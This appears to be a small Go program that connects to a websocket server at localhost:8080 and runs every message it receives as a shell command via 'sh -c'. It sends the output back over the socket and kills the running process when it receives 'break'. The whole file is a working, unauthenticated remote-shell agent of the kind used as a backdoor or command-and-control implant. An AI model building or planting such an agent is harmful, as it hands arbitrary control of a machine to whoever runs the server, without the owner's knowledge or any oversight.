package main

import (
	"log"
	"os/exec"

	"golang.org/x/net/websocket"
)

const (
	serverAddr = "http://localhost:8080/commands?id="
	url        = "ws://localhost:8080/commands?id="
)

var (
	commandExecChan = make(chan string)
	secondCommand   = make(chan string)
)

func main() {

	id := "cum"
	generatedURL := url + id
	generatedOrigin := serverAddr + id

	conn, err := websocket.Dial(generatedURL, "", generatedOrigin)
	if err != nil {
		log.Fatal(err)

	}
	var cmd *exec.Cmd

	go func() {
		for {
			command := <-commandExecChan
			log.Println(command)
			if command == "break" {
				secondCommand <- command
				continue
			}
			cmd = exec.Command("sh", "-c", command)
			cmd.Stdout = conn
			cmd.Stderr = conn

			cmd.Start()

		}
	}()
	go func() {

		for {
			<-secondCommand
			log.Println("okay , wait please")
			if err := cmd.Process.Kill(); err != nil {
				log.Println(err)
			}

		}
	}()

	for {
		msg := make([]byte, 500)
		n, err := conn.Read(msg)
		if err != nil {
			log.Fatal(err)
		}
		commandExecChan <- string(msg[:n])
	}

}
